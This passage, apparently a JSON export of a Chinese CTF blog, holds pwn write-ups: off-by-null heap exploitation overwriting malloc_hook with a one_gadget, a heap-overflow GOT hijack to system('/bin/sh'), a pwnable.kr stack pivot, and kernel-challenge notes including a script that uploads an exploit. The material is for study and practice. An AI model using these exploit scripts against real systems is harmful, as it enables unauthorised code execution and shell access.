chunk0，就会造成程序崩溃)\n\n(3)修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。\n\n(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中，调试过程可以发现，chunk0的size位被修改成了sizeof(chunk0+chunk1+chunk2)。但是这里实际情况中，chunk1并没有被释放，只是它的内存处在被释放的内存中间，依然可以通过chunk1的指针来操作。也就是在这个程序中依旧可以进行edit来修改chunk1，或者show来打印chunk1。\n\n(5)再次申请chunk0大小，这样就会割裂unsortedbins中的remainder为chunk0+new_remainder，把chunk0申请回来，剩下的new_remainder依旧放在unsortedbins中。在unsortedbins中的remainder有个特点，就是该chunk的fd和bk一定指向unsortedbins链表头部，(如果有多个remainder，那么顺序类似于smallbins，依旧可以使用第一个chunk的bk来获取unsortedbins链表头部)\n\n(6)那么现在unsortedbins中有chunk1和chunk2，而chunk1的fd和bk都指向unsortedbins链表头部，并且在程序中chunk1仍旧处于使用状态，fd和bk就是chunk1的data部分。所以show函数就可以打印出chunk1的data部分，从而打印出fd和bk指向的unsortedbins头部链表地址。又由于unsortedbins处在main_arena+0x58位置，而main_arena相对于libc基地址的偏移是固定的，为0x3c4b20(不同glibc版本可能不同，这是libc2.23的)，所以这也就间接泄露出了libc基地址。\n\n▲查询main_arena方法：\n\n①工具查询：https://github.com/coldwave96/libcoffset：\n\n②IDA查询：main_arena存储在libc.so.6文件的.data段，使用IDA打开libc文件，然后搜索函数malloc_trim()\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg)\n\n \n\n3.现在有了libc基地址，那么接下来就考虑修改mallo_hook和realloc_hook的值。同样使用0字节溢出漏洞，伪造fakechunk为mallo_hook地址，修改fakechunk从而修改malloc_hook和realloc_hook。这里先忽略上面的，程序中的索引会不太一样。攻击思路如下：\n\n(1)先申请一个较大的chunk，防止和上面的合并\n\n(2)之后的操作方法类似，先申请四个chunk，分别为chunk0,chunk1,chunk2,chunk3。(chunk3防止合并用)\n\n(3)free掉chunk0，使其进入unsortedbins中。修改chunk1的最后八个字节，也就是chunk2的pre_size位，使得chunk2的pre_size位的大小为chunk0_size+chunk1_size。\n\n(4)free掉chunk2，使得chunk0,chunk1,chunk2三个chunk作为一个整体被合并之后放入到unsortedbins中。再free掉chunk1，使其进入fastbins中。这样chunk1即在fastbins中，也处在unsortedbins中。\n\n(5)申请一个特殊大小的chunk块，最小为chunk0_size+0x20，使其的data部分足够大，能够修改掉chunk1的fd位，将chunk1的fd位指向fakechunk，由于需要从size位覆盖到fd，所以需要伪造合法的size，为chunk1_size。\n\n(6)申请两个chunk1大小的chunk_a，chunk_b，这样第一次申请的chunk_a就是从fastbins中回来的chunk1。而chunk_b就是chunk1的fd指向的fakechunk。这样如果将fakechunk放在realloc_hook之前，那么就可以修改掉realloc_hook和malloc_hook，使得realloc_hook指向one_gadget，而malloc_hook指向__libc_libc函数中的某个可以控制栈帧的地址，从而满足gadget条件来getshell。\n\n4.开始编写exp，增删改查函数就不说了:\n\n(1)获取libc基地址：\n\n```\n#注释头\n\nadd(0xf0,'0'*0xf0)\nadd(0x68,'1'*0x68)#trigger 0ff-by-null\nadd(0xf0,'2'*0xf0)\nadd(0x10,'3'*0x10)\n#chunk0,chunk1,chunk2,chunk3(防止合并)\n\ndelete(0)#防止程序崩溃\nedit(1,0x68,flat('1'*0x60,0x170))\n#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中\ndelete(2)\n#触发chunk2的pre_size作用\n\n#关键就在这个add，目的就是将unsortedbins的链表头部放到chunk1的fd和bk位\nadd(0xf0,'x'*0x10)\n\n#现在就可以打印chunk1来获取unsortedbins链表的头部地址，从而计算得到libc地址\nshow()\nlibc_address = u64(io.recvuntil(\"\\x7f\")[-6: ]+'\\0\\0')-0x3c4b78\nprint(\"libc @ {:#x}\".format(libc_address))\n```\n\n(2)伪造fakechunk：\n\n```\n#注释头\n\nadd(0x160,'4'*0x160)\n#第一个chunk防止合并加程序崩溃\n\nadd(0xf0,'a'*0xf0)\nadd(0x68,'b'*0x68)\nadd(0xf0,'c'*0xf0)\nadd(0x10,'d'*0x10)\n#四个chunk，套路一样。由于程序编写原因，所以索引变成chunk4,chunk5,chunk6,chunk7,对应上面的chunk0,chunk1,chunk2,chunk3。\n\n\ndelete(4)#防止程序崩溃\nedit(5,0x68,flat('b'*0x60,0x170))\n#修改chunk2的pre_size，使得chunk0,chunk1,chunk3手牵手进入unsortedbins中\ndelete(6)\n#触发chunk6的pre_size作用\n\ndelete(5)\nadd(0x120,flat('A'*0xf8,0x70,(libc_address+0x3c4aed)))\n#使得chunk5进入fastbins，之后修改其fd位，创造一个fakechunk进入fastbins。这里的fakechunk_addr就是libc_address+0x3c4aed。这里的0x70写成0x71也是一样的，因为之后是malloc，不会管chunk的IN_USE位，也就是P位。\n```\n\n(3)申请获得fakechunk，同时修改该fakechunk，劫持malloc_hook和realloc_hook。\n\n```\n#注释头\n\nadd(0x68,'x'*0x10)\nadd(0x68,flat('\\0'*11,(libc_address+one_gadget),(libc_address+16+libc.sym[\"__libc_realloc\"])))\n```\n\n(4)随便申请一个chunk即可getshell，但是这里不要使用之前我们定义的add函数，因为程序一旦call malloc即可getshell，即运行到输入长度即可，但是我们的add函数中一直运行到输入内容才结束，会导致程序卡住，所以应该是：\n\n```\n#注释头\n\nio.sendlineafter(\"choice:\",\"2\")\nio.sendlineafter(\":\",\"anything\")\n\nio.interactive()\n```\n\n5.这里需要很多调试的步骤：\n\n(1)从最开始打算伪造fakechunk时就应该知道我们的chunk大小应该设置为0x68，因为程序跑起来是0x7f开头，拿来伪造size再合适不过，这样的chunk大小是0x70。而我们又只能用0字节溢出，所以需要将chunk设置到最大，也就是0x70-0x08。\n\n(2)而0xf0可以改变，只要比fastbins_MAX大就行，那么对应的0x170也需要改变，同时也要改变0x120。\n\n(3)申请fakechunk步骤中的'\\0'*11也是需要通过调试算出来，方法就是gdb查看realloc_hook-0xxx附近的内存，选择合适的可以伪造size的地址，之后通过填充padding来覆盖realloc_hook和malloc_hook。\n\n(4)onegadget相关的+16也得通过调试才能知道，这里选取的onegadget条件是[rsp+0x30]==Null。所以调试时将断点下在__libc_realloc函数上，进入__libc_realloc函数，从而一直进入到onegadget的执行代码中，如下：\n\n先下断点让程序运行到这![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg)\n\n再输入ni进入:![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg)\n\n这时候就可以看rsp的值了：![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg)\n\n这里的rsp是0x7ffca3331eb8，rsp+0x30=0x7ffca3331ee8，对应图中的值就得是0才满足条件(这里已经计算过了，+16)\n\n▲如果从最开始进入__libc_realloc函数，进入到onegadget中之后，发现条件不满足，那么需要观察前后的值，从而决定从哪里进入__libc_realloc函数才能使得rsp满足。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg)\n\n因为__libc_realloc(就是realloc)函数有一堆的push和sub操作，少一个push，那么rsp就可以下挪0x08，相当于rsp+0x08，中间还有sub rsp,xxh，相当于上挪rsp。所以决定从哪里进入realloc函数决定了onegadget的成功与否。![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg)\n\n而通过汇编代码可以看到，实际的onegaget是通过0x84724 mov rax,cs:__realloc_hook_ptr传进来，之后由于\n\n```\n#注释头\n\ntest rax rax\njnz  loc_84958\n```\n\nrax不为0，必定跳转loc_84958:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg)\n\n这里才是我们选择调用进入onegadget的入口。所以之前在__libc_realloc的计算都是为了调整栈帧，不然其实如果栈帧不用调整就可以满足，那么我们可以直接将malloc_hook改成onegadget也可以直接getshell。因为__libc_malloc函数中的汇编代码也是类似的：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg)\n\n而且这还是一个无条件跳转。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg)\n\n可以看到有两个push,一个sub rsp,8;两个Pop。相当于只要在call malloc之前，我们的rsp+0x28==NULL即可满足onegadget的rsp+0x30==NULL的条件。当然，以上只是在Libc2.23下的，如果是其它版本的libc就可能不太一样。\n\n \n\n \n","tags":["off-by-null"],"categories":["PWN","pwn堆-off-by-null"]},{"title":"pesp_heap-overflow","url":"/2021/08/14/pesp_heap-overflow/","content":"\n1.常规checksec，开了canary和NX，Partial RELRO。开IDA找漏洞，change函数中存在堆溢出:\n\n```\n#注释头\n\nint v0; // ST08_4\nchar nptr; // [rsp+20h] [rbp-10h]\nchar buf; // [rsp+10h] [rbp-20h]\n----------------------------------------------------------\nprintf(\"Please enter the index of servant:\");\nread(0, &buf, 8uLL);\nv2 = atoi(&buf);\n--------------------------------------------------------------\nprintf(\"Please enter the length of servant name:\", &buf);\nread(0, &nptr, 8uLL);\nv0 = atoi(&nptr);\n```\n\n可以发现change函数中，并没有检查堆块的大小，我们输入多少，它就认为是多少，所以这里可以制造堆溢出。\n\n2.这题有很多其它漏洞，这里先只利用堆溢出来思考下。\n\n(1)先申请两个chunk，chunk1和chunk2，然后修改chunk1的大小和内容，使得溢出数据，将chunk2的fd改成got表中地址，之后释放掉chunk2，使其在fastbins中的结构为:\n\n```\n#注释头\n\nfastbins->chunk2\nchunk2.fd=got_addr。\n```\n\n这样就可以再申请chunk_a，chunk_b，这里的chunk_a就是从fastbins中申请回来的chun2，而chunk_b的首地址就是got_addr。之后通过修改chunk_b的内容，这样就可以修改got表中的内容，从而劫持got表。\n\n(2)由于这里引入了printf函数，所以可以将free函数的got表劫持为printf(plt)函数，这样就可以在free一个chunk时制造格式化字符串漏洞，通过修改chunk内容为需要的格式化字符之后，再通过该格式化字符串漏洞泄露栈上某函数的Libc地址，从而计算得到libc基地址，从而计算得到system函数真实地址。\n\n(3)之后再通过上述方法，将free_got劫持为system_real_addr，之后释放一个内容为binsh字符串的chunk，就相当于调用system(\"/bin/sh\")，从而getshell。\n\n3.开始编写payload\n\n(1)首先确定增删改查函数：\n\n```\n#注释头\n\ndef show():\n    io.sendlineafter(\"choice:\",\"1\")\n\ndef add(length,cont):\n    io.sendlineafter(\"choice:\",\"2\")\n    io.sendlineafter(\":\",str(length))\n    io.sendafter(\":\",cont)\n    sleep(0.01)\n\ndef edit(idx,length,cont):\n    io.sendlineafter(\"choice:\",\"3\")\n    io.sendlineafter(\":\",str(idx))\n    io.sendlineafter(\":\",str(length))\n    io.sendafter(\":\",cont)\n    sleep(0.01)\n\ndef delete(idx):\n    io.sendlineafter(\"choice:\",\"4\")\n    io.sendlineafter(\":\",str(idx))\n```\n\n(2)尝试修改got表，制造格式化字符串溢出漏洞\n\n```\n#申请三个chunk，chunk0,chunk1,chunk2包括之后需要的格式化字符。\nadd(0x50,'000000')\nadd(0x50,'111111')\nadd(0x10,\".%17$p.\")\n#64位程序，将断点下在change函数中的call free，观察此时栈中数据，可以发现从rsp往下数12是libc_main_addr，计算偏移为12+6-1=17.\n\n#释放chunk1,之后修改chunk1的fd位使其指向fakechunk\ndelete(1)\nedit(0,0x100,flat('0'*0x50,'00000000',0x61,0x601ffa))\n#这里两条代码顺序不能改变，因为当chunk1被释放时，其fd位会发生改变，指向0x0，第一个进入fastbins的chunk其fd只要不被修改，一直都是指向0x0。所以需要先释放，再修改，防止之后fd被修改指向0x0。\n#现在fastbins为:fastbinsY[0]->chunk1->fakechunk\n\n#连续申请两个chunk，将chunk1和fakechunk申请回来，同时劫持got表，将free函数的got表值改成printf的plt表值，调用plt表中代码，从而调用printf函数。\nadd(0x50,'xxxxxxxx')\nadd(0x50,flat(\"\\0\"*0xe,flat(elf.sym[\"printf\"])[:6]))#get fakechunk,change got\n\n#释放chunk2，触发free函数，也就是劫持后的printf函数，得到栈上地址libc_main_addr，计算得到libc_address\ndelete(2)\nio.recvuntil(\".\")\ntemp = io.recvuntil(\".\",drop=True)\nlibc_address = int(temp,16) - 0x20840\n```\n\n(3)再次劫持got表为system函数，释放Binsh字符chunk，getshell\n\n```\n#注释头\n\n#这里的chunk3就是fakechunk，也就是got表\nedit(3,0x50,flat('\\0'*14,flat(libc_address+libc.sym['system'])[:6]))\nadd(0x10,\"/bin/sh\\0\")\n#由于前一个释放的是chunk2，所以这里再次申请回来的索引还是2，可以多次运行程序尝试就可以知道，当前面某个的chunk为空时，申请的chunk会先填满前面的空的chunk索引。\ndelete(2)\nio.interactive()\n```\n\n▲制造fakechunk时，需要设置合法的size，不然如果fastbins中的chunk.fd指向fakechunk，而fakechunk的大小又不是该fastbins组中，那么程序会崩溃。所以在最开始设置大小时，就需要好好计算以下，通过调试看看got表中在free函数前能不能找到还没被延迟绑定的函数可以确定计算大小，或者看其它函数的got表最后三位也可以，这样才能制造合法size使得程序不会崩溃。这里用到的0x601ffa就是调试过程中发现能用的，并且还需要填充0xe，也就是14个字节。\n","tags":["overflow"],"categories":["PWN","pwn堆-overflow"]},{"title":"pwn-kernel_Heap总结","url":"/2021/08/14/pwn-kernel_Heap总结/","content":"\n一、SLUB和SLAB：内核的堆比用户的堆会简单很多，需要了解一些机制。\n\n1.分配的大小：也是类似对齐的，但也有点不同\n\nlinux下查看命令：cat /proc/slabinfo\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_12-46-27.png)\n\n可以看到kmalloc分为很多的大小，从大到小分别为8k->8字节，每个都相当于是一个桶，里面存储所有的空闲块或者非空闲块。所以当我们分配17字节时，得到的空间其实是32字节，5K字节得到的是8K字节的空间。这个在用堆溢出的时候需要用到。\n\n \n\n2.管理机制：单链表结构\n\n(1)申请原则：\n\n以一定大小的空闲chunk作为一个单链表，以fd串联，并且chunk的结构只有一个fd，不像用户态中有有头结构：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-14-21.png)\n\n如果申请期间改变了空闲链表第一个chunk的fd，那么再申请一次得到该chunk，然后再申请就得到修改后的fd。如上图，如果0xffff8880029f8000是对应slub桶大小的chunk空闲链表第一个，那么申请该大小chunk后得到的是0xffff8880029f8000，再申请一次就会得到0x6bc360。\n\n▲这个具体的管理结构不知道在哪，但是如果再申请该大小的chunk：\n\n①0x6bc360在被申请出来之前，其fd为一个有效的可用地址，比如\n\n0x6bc360 --> 0x6bc460，那么就会得到连续得到0x6bc360和0x6bc460。\n\n②0x6bc360在被申请出来之前，其fd为0，比如\n\n0x6bc360 --> 0x0，那么先得到0x6bc360，然后会从另一个桶中申请chunk，该大小的空闲链表桶就会废弃不再使用，相当于系统默认该桶用完。之后再申请该大小的chunk会从新桶中继续申请。\n\n③0x6bc360在被申请出来之前，其fd为无效地址，比如\n\n0x6bc360 --> 0x40，那么先得到0x6bc360，然后再申请，系统就会崩溃。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-25-50.png)\n\n \n\n(2)释放原则：\n\n同样是以一定大小的空闲chunk作为一个单链表，以fd串联，也类似fastbin结构，先进后出：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-38-53.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-39-01.png)\n\n这里可以看到，释放完三个chunk之后，再申请，会先得到chunk0，再得到chunk2，chunk1。所以这里也同样可以看出，在释放之后，该chunk的fd会被改写，指向下一个空闲chunk。只不过不用看size和其他七七八八的检查，只用fd即可打类似fastbin的攻击了，方便了很多。\n","tags":["kernelHeap-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwn-kernel_做题知识","url":"/2021/08/14/pwn-kernel_做题知识/","content":"\n一、题目给的文件：\n\n1.bzImage：就是linux编译后的运行内核，在启动参数中设置即可。\n\n2.file.cpio：题目给的，有的可以直接用qemu启动运行，但是有的需要解压后再打包，具体看题目。\n\n3.xx.sh文件:启动文件，里面包含代表qemu启动时的各种参数：\n\n(1)qemu-system-x86_64：架构\n\n(2)-m：设置运行内存。\n\n-m 64M\n\n-m 128M....\n\n(3)-kernel：设置运行的内核，一般题目会给，自己也可以去 [www.kernel.org](http://www.kernel.org) 来下载编译内核。\n\n-kernel bzImage\n\n(4)-initrd：设置初始化的根文件系统，就是.cpio文件，题目给的可能有陷阱什么的，一般我们需要解压然后看看其中的init是不是有些干扰东西。\n\n例如poweroff -d 120 -f & 这行代码就代表定时关机，这就需要去掉，去掉可能的干扰后就再打包，重新生成.cpio文件，然后通过./xx.sh启动\n\n①解压：\n\nmkdir file\n\ncd file\n\ncpio -idm < ./core.cpio  //再次解压\n\n```\n#注释头\n\nmv ../file.cpio file.cpio.gz  //改名，方便gunzip识别格式\ngunzip ./file.cpio.gz     //解压\n#如果是正常cpio打包则不需要，但是有的题目就会有用Gunzip压缩之后再cpio打包。\n```\n\n然后删除file.cpio文件，没啥用了，那么现在的目录下的文件如果再打包生成cpio文件就会是qemu加载之后的根目录文件系统了。\n\n-initrd ./core.cpio\n\n②打包：\n\n切换到根目录下：\n\nfind ./* | cpio -H newc -o > file.cpio\n\n当前目录下就生成file.cpio文件，拖到和start.sh、bzImage放到一个目录下，运行start.sh就可以启动qemu虚拟机了。\n\n(5)-append：附加的字符串，为grub引导内核时附加的命令行参数，指明控制台，特权，初始路径等，指定no kaslr可以关闭随机偏移。\n\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\"\n\n(6)-s：添加gdb调试的相关条件，只用-s就行，等同于-gdb tcp::1234\n\n(7)-cpu 设置cpu安全选项。kvm64是加速器\n\n-cpu kvm64,+smep  (kvm64，开启smep保护)\n\n(8)--nographic：设置为无图形界面\n\n还有其它的各种选项参数，遇到题目再查吧，需要注意的是smep,smap,kaslr等相关的\n\n4.vmlinux：静态编译，未经过压缩的kernel文件，bzImage是压缩后的文件。\n\n \n\n二、根文件目录下的文件：\n\n1.init：启动系统的参数设置，很多，慢慢看，多了解。\n\n(1)insmod：加载驱动，一般就是file.ko文件，找到它来分析。\n\n(2)poweroff：关机，相关定时一般去掉\n\n(3)setsid：设置终端权限，id为0即为root，本地修改为0即为root权限\n\nsetsid /bin/cttyhack setuidgid 1000 /bin/sh\n\n2.file.ko文件：一般这个就相当于是常规pwn的binary文件，漏洞应该在这里面，可以用IDA打开来分析。\n\n3.vmlinux：题目没直接给的，一般cpio压缩包中都会有，可以用来查gadget。\n\ntime ropper --file ./vmlinux --nocolor > g1\n\ntime ROPgadget --binary ./vmlinux > g2\n\n没有的也可以提取出来：\n\n./extract-vmlinux ./bzImage > vmlinux\n\n(extract-vmlinux文件：https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux )\n\n4.其它的就没什么重要的了，然后有的题目会有gen_cpio.sh相关文件，用来生成cpio文件，这时候就直接使用，如果用find ./* | cpio -H newc -o > file.cpio可能并不太好使。\n\n \n\n \n\n三、gdb调试：\n\n1.start.sh中设置-s或者-gdb tcp::1234\n\n2.设置init中的setsid，设置为root权限\n\n3.加载符号表：\n\n(1)qemu内：\n\ncat /sys/module/core/sections/.text  //找到基地址\n\n0xffffffffc018b000\n\n(2)qemu外：\n\ngdb ./vmlinux -q\n\nadd-symbol-file ./file.ko 0xffffffffc018b000\n\n(现在就可以对函数下断点：b core_read，或者根据file.ko文件中的函数偏移加上基地址。)\n\n4.连接到qemu内部的文件：\n\nqemu外的gdb中输入：\n\ntarget remote localhost:1234\n\n之后就可以互动，通过编写exp启动来触发断点。\n\n \n\n \n\n四、提权：\n\n(1)本地：\n\n将编译后的exploit放到初始根目录文件系统中/tem中，再次打包生成cpio文件，运行qemu，之后运行exploit即可。\n\n(2)远程：\n\n本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。\n\n编译：gcc exploit.c -static -masm=intel -g -o exploit\n\n可以用python配上busybox来设置：\n\n①在本地有exploit的文件夹下运行：python2 -m SimpleHTTPServer\n\n记住本地ip，端口为8000\n\n②在远程中运行：wget -O ./exploit http://192.168.80.132:8000/exploit\n\n这样就可以通过网络来传输exploit\n\n(3)真实题目环境可能没有网络，这时候需要用到脚本：\n\n```\n#注释头\n\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nimport os\n\n# context.log_level = 'debug'\ncmd = '# '\n\ndef exploit(r):\n    r.sendlineafter(cmd, 'stty -echo')\n    os.system('musl-gcc -static -O2 ./poc/exp.c -o ./poc/exp')\n    os.system('gzip -c ./poc/exp > ./poc/exp.gz')\n    r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')\n    r.sendline((read('./poc/exp.gz')).encode('base64'))\n    r.sendline('EOF')\n    r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')\n    r.sendlineafter(cmd, 'gunzip ./exp.gz')\n    r.sendlineafter(cmd, 'chmod +x ./exp')\n    r.sendlineafter(cmd, './exp')\n    r.interactive()\n\n\np = process('./boot.sh', shell=True)\n# p = remote('127.0.0.1',0000 )\n\nexploit(p)\n```\n\n这里需要在当前目录下新建一个 poc 文件夹，把 exp.c 文件放进去，或者自己修改下脚本也可以，另外还需要安装musl-gcc，在ubuntu下：apt-get install musl-tools\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191511955.jpeg)\n\n这是sixstars 战队中一位师傅的脚本，不知道是哪位大佬的。\n\n \n","tags":["Kernel-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwnable.kr-login","url":"/2021/08/14/pwnable.kr-login/","content":"\n1.常规checksec一下，开了canary和NX，然后IDA打开分析漏洞。发现auth函数中可能存在栈溢出：\n\n```\n#注释头\n\nint v4; // [esp+20h] [ebp-8h]\n------------------------------------\nmemcpy(&v4, &input, a1);\n```\n\n如果a1大于8h，而我们可以控制input，那么就可以造成栈溢出。再往上翻一下，发现就是将我们的输入通过一系列操作给到input，然后a1是input的长度。\n\n实际情况是将我们的输入给s，进行Base64解码，然后给v4，长度给v6。v4又给input，v6传值到达auth函数赋值给a1。这里input是全局变量，所以auth函数中的input中的内容其实就是我们输入经过base64解码的内容。\n\n```\n#注释头\n\n_isoc99_scanf(\"%30s\", &s);\n--------------------------------------------------\nv6 = Base64Decode((int)&s, &v4);\n--------------------------------------------------\nmemcpy(&input, v4, v6);\n------------------------------------------------------\nauth(v6) == 1\n```\n\n▲题外话：最开始Base64搞不懂哪个是输入，哪个是输出，直接经过调试就可以判断。况且最开始的v4是0，总不能程序永远都将0进行base64解码然给到我们的输入地址中吧。但是调试的时候发现，每次输入相同的值，但是解码后得到的v4的值却是不一样的。这就纳闷了，为什么一样的输入四个AAAA得到的解码值不一样呢，难道程序还有个随机变量不成。之后再仔细调试发现这个base64decode有点不一样，虽然传入的两个参数都是地址，但是第一个参数的操作却是从该地址直接取值进行解码，然后对于第二个参数的操作却并不是将解码结果给到第二个参数，而是再开辟一块堆内存，之后将该堆内存的地址给到第二个参数。所以每次解码后第二个参数，也就是栈上的一个值，总是不一样，因为这里保存的是一个随机生成的堆地址，而不是解码后的值。同样之后观察main函数中的memcpy也可以发现：memcpy(&input, v4, v6);而memcpy的原型是：\n\n```\n#注释头\n\nvoid *memcpy(void *dest, const void *src, size_t n)\n```\n\n前两个参数类型都应该是地址才对，而这里却直接将v4的值给传进去，那不就说明v4的值是一个地址吗。然后再跳转到汇编代码分析一波:\n\n```\n#注释头\n\n.text:080493B3   call _memset\n.text:080493B8   mov dword ptr [esp+18h], 0\n.text:080493C0   lea eax, [esp+18h]\n.text:080493C4   mov [esp+4], eax\n.text:080493C8   lea eax, [esp+1Eh]\n.text:080493CC   mov [esp], eax\n.text:080493CF   call Base64Decode\n```\n\n同样Base64Decode函数的两个参数也都是地址，这里是直接取栈地址给到eax，然后再将eax的值给相应esp指向的栈内存。所以可以看到Base64Decode取值应该是从栈上取两个地址才对，分别位于main函数栈的是esp+4和esp。所以如果这里有个格式化字符串那么就完全可以泄露处出栈地址，之后就完全可控，可惜没有。还是回到正轨分析吧。\n\n2.所以经过前面分析，程序要求我们输入一个base64编码过的字符串，随后会进行解码并且复制到位于bss段的全局变量input中，最后使用auth函数进行验证，通过后进入带有后门的correct()打开shell。并且由于长度有限制：所以我们的输入base64解码后最多只能有12个字节。\n\n```\n#注释头\n\nif ( v6 > 12 )\n{\n    puts(\"Wrong Length\");\n}\n```\n\n3.汇总一下，程序存在栈溢出，但只能溢出4个字节，也就是一个地址，也就是最多只能覆盖到ebp，然后存在后门函数。由于没办法直接覆盖返回地址，所以这里就在ebp上做文章，使用栈劫持技术。之前的栈劫持可以用rop，但是这里没办法，因为无法进行返回地址覆盖。但是还有一个地方，就是我们的输入最后会被解码赋值给input，这个input是个全局变量，不受到ASLR影响，而又可以控制12个字节，如果可以把栈挪移到这个地方，那么就是可控了。\n\n栈模型如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548702.png)![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548716.png)\n\n可控栈如下：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548659.png)\n\n4.总体思路应该是：\n\n①劫持auth函数的栈底到input_addr，那么auth函数在退出到main函数时，main函数栈的栈底就不会回到之前的main函数栈栈底，而是会挪移到我们input_addr，也就是payload3的值。\n\n②开始执行auth函数中的退出操作，到leave时，执行操作leave的第一步汇编操作mov esp ebp，将栈顶指向ebp指向的内容，此时ebp已经被修改成了payload3，而payload3会被赋值成Input_addr，也就是esp会指向input_addr。\n\n②执行leave第二步汇编指令pop ebp，将当前栈顶的值赋值给ebp，也就是ebp的值会变成payload1，(这里的payload1没什么作用，可以随便填)之后esp由于pop，esp+0x4，会往栈底移动一个地址，移动到指向我们输入的payload2处。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548823.png)\n\n④之后retn执行，实际指令为pop eip，也就是将当前栈顶数据给eip，也就是eip被赋值为我们payload中的payload2。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191548769.png)\n\n⑤最后执行retn的第二条实际指令：jmp eip，此时eip就已经是payload2的值，所以将该payload2设置为correct函数地址或者是system(\"/bin/sh\");就可以getshell。\n\n总的来说，就是利用leave和retn两个操作来劫持eip的值，使其直接指向后门函数，一步getshell。\n\n5.创建payload，组成应该是：\n\n```\n#注释头\n\n#首先确定地址：\ncorrect_addr = 0x08049278\ninput_addr = 0x0811eb40\n```\n\n之后确定payload的组成：\n\npayload = padding + eip + input_addr。\n\n```\n#注释头\n\npayload = \"aaaa\"\t\t\t\t#padding\npayload += p32(0x08049284)\t\t\n#system(\"/bin/sh\")地址，整个payload被复制到bss上，栈劫持后retn时栈顶在这里\npayload += p32(0x0811eb40)\t\t#新的eip地址\n```\n\n最后得注意发送的是base64编码之后的payload。\n\n \n\n参考资料:\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["hijackStack"],"categories":["PWN","hijackStack0x4"]},{"title":"pwn-kernel_前置知识","url":"/2021/08/14/pwn-kernel_前置知识/","content":"\n一、内核前置基础知识：\n\n1.physmap：\n\nphysmap是内核管理的一块非常大的连续的虚拟内存空间，为了提高效率，该空间地址和RAM地址直接映射。RAM相对physmap要小得多，导致了任何一个RAM地址都可以在physmap中找到其对应的虚拟内存地址，而用户空间的虚拟内存也会映射到RAM。\n\n所以可能会形成如下关系：\n\nusr_data--->RAM---->physmap\n\n那么physmap中就有可能会保存usr_data，那么就为提权代码放到内核空间提供了前置条件，同时有mmap就可能会导致条件竞争。\n\n \n\n2.ioctl：系统调用，用于与设备通信\n\n由于内核和用户空间隔离开，所以就需要一个接口来使得用户可以在一定情况下访问内核空间：\n\nint ioctl(int fd, unsigned long request, ...)\n\n第一个参数为打开设备 (open) 返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。\n\n \n\n \n\n3.状态转换相关操作：\n\n当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换\n\nENTRY(entry_SYSCALL_64)\n\n(1).用户态至内核态：\n\n①swapgs指令触发，切换到kernel GS：\n\nSWAPGS_UNSAFE_STACK\n\n②保存栈值，设置内核栈：\n\nmovq %rsp, PER_CPU_VAR(rsp_scratch)\n\nmovq PER_CPU_VAR(cpu_current_top_of_stack), %rsp\n\n③压栈保存寄存器：\n\n```\n#注释头 \n\n/* Construct struct pt_regs on stack */\npushq  $__USER_DS      /* pt_regs->ss */\npushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */\npushq  %r11             /* pt_regs->flags */\npushq  $__USER_CS      /* pt_regs->cs */\npushq  %rcx             /* pt_regs->ip */\npushq  %rax             /* pt_regs->orig_ax */\npushq  %rdi             /* pt_regs->di */\npushq  %rsi             /* pt_regs->si */\npushq  %rdx             /* pt_regs->dx */\npushq  %rcx tuichu    /* pt_regs->cx */\npushq  $-ENOSYS        /* pt_regs->ax */\npushq  %r8              /* pt_regs->r8 */\npushq  %r9              /* pt_regs->r9 */\npushq  %r10             /* pt_regs->r10 */\npushq  %r11             /* pt_regs->r11 */\nsub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */\n```\n\n④判断类型并跳转：\n\n```\n#注释头\n\nmovq PER_CPU_VAR(current_task), %r11\ntestl 